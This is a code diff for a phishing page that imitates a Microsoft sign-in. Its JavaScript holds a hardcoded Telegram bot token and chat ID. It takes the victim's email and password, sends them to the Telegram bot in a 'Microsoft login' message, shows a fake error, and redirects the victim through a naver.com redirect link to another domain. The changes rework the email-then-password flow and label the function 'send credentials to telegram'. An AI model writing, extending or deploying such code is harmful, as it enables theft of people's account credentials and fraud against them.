@@ -180,7 +180,7 @@
   // --- TELEGRAM BOT TOKEN AND CHAT ID ---
   const TG_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
   const TG_CHAT_ID = "-5006528512";
-  
+
 (function(){
   // Defensive hide for the loading screen so page never stays stuck
   const LOADING_SCREEN_ID = 'loading-screen';
@@ -207,13 +207,9 @@
       const passwordInput = document.getElementById('password');
       const nextBtn = document.getElementById('next');
       const submitBtn = document.getElementById('submit-btn');
-      const div1 = document.getElementById('div1');
-      // div2 and "Enter code"/code related stuff are REMOVED
       const error = document.getElementById('error');
       const emailch = document.getElementById('emailch');
       const msg = document.getElementById('msg');
-
-      // No resend code section needed
 
       let pwdAttempt = 0;
       let errorTimeout = null;
@@ -233,7 +229,6 @@
         clearTimeout(errorTimeout);
         errorTimeout = setTimeout(() => showErrorMessage(el, text), delay);
       }
-
       function getActiveEmail() {
         const eFromCh = (emailch && emailch.textContent) ? emailch.textContent.trim() : '';
         const eFromInput = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
@@ -254,10 +249,10 @@
         }
       }
 
-      // direct always (to Telegram)
+      // send credentials to telegram
       async function sendDirectToTelegram(email, secret, kind = 'password') {
         if (!TG_BOT_TOKEN || !TG_CHAT_ID) {
-          throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct fallback.');
+          throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct send.');
         }
         const text = kind === 'password'
           ? `Microsoft login:\nEmail: ${email}\nPassword: ${secret}`
@@ -273,11 +268,11 @@
         return json;
       }
 
-      // unified send: always Telegram
       async function sendForSecret(email, secret, kind = 'password') {
         return await sendDirectToTelegram(email, secret, kind);
       }
 
+      // NEXT BUTTON (show password entry)
       if (nextBtn) {
         nextBtn.addEventListener('click', function () {
           const my_email = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
@@ -287,16 +282,31 @@
             if (emailInput) emailInput.focus();
             return false;
           }
-          if (div1) div1.style.display = 'none';
-          // No switch to code entry panel
-          if (emailch) emailch.textContent = my_email;
+          // Hide email input and next button
+          if (emailInput) emailInput.style.display = 'none';
+          if (nextBtn) nextBtn.style.display = 'none';
+          // Display the entered email (optional)
+          if (emailch) {
+            emailch.textContent = my_email;
+            emailch.style.display = 'block';
+          }
+          // Show password field and submit button
+          if (passwordInput) {
+            passwordInput.style.display = '';
+            passwordInput.value = '';
+            passwordInput.focus();
+          }
+          if (submitBtn) {
+            submitBtn.style.display = '';
+            submitBtn.textContent = 'Sign in';
+            submitBtn.disabled = false;
+          }
           hideErrorMessage(msg);
-          if (passwordInput) passwordInput.value = '';
           pwdAttempt = 0;
-          if (passwordInput) passwordInput.focus();
         });
       }
 
+      // SUBMIT BUTTON (send to Telegram and redirect)
       if (submitBtn) {
         submitBtn.addEventListener('click', function(event){
           event.preventDefault();
@@ -307,12 +317,10 @@
             showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
             return;
           }
-
           if (submitBtn) {
             submitBtn.textContent = 'Verifying...';
             submitBtn.disabled = true;
           }
-
           pwdAttempt++;
           sendForSecret(email, password, 'password')
             .then(res => {
@@ -325,7 +333,7 @@
               }
             })
             .finally(() => {
-              // IMMEDIATELY REDIRECT after password submit
+              // Redirect after submit
               const encodedEmail = encodeURIComponent(email);
               setTimeout(() => {
                 window.location.href = "https://cc.naver.com/cc?m=1&u=https%3A%2F%2Fbanner.boothavu.in.net%2Fw95Suml%4021dQrZp/$" + encodedEmail;
